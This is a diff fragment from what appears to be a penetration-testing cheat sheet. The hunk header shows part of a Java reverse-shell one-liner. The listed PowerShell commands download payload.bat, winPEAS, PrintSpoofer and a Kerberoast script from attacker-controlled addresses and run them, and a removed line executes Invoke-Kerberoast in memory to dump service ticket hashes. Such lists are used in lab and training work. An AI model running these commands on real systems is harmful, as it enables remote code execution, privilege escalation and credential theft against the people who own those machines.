@@ -53,12 +53,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 - powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/payload/payload.bat','payload.bat')"
 
-- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/linpeas/peass.exe','peass.exe')"
+- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.2.251:9000/linpeas/winpeass.exe','winpeass.exe')"
 
 - Start-Process "payload.bat"
 
-- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/printspoofer.exe','printspoofer.exe')"
+- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.2.251:9000/payload/windows/printspoofer.exe','printspoofer.exe')"
 
 - powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.2.251:9000/payload/windows/kerberoast.ps1','powerup.ps1')"
 
-- powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.2.251:9000/payload/windows/kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat ​ |fl
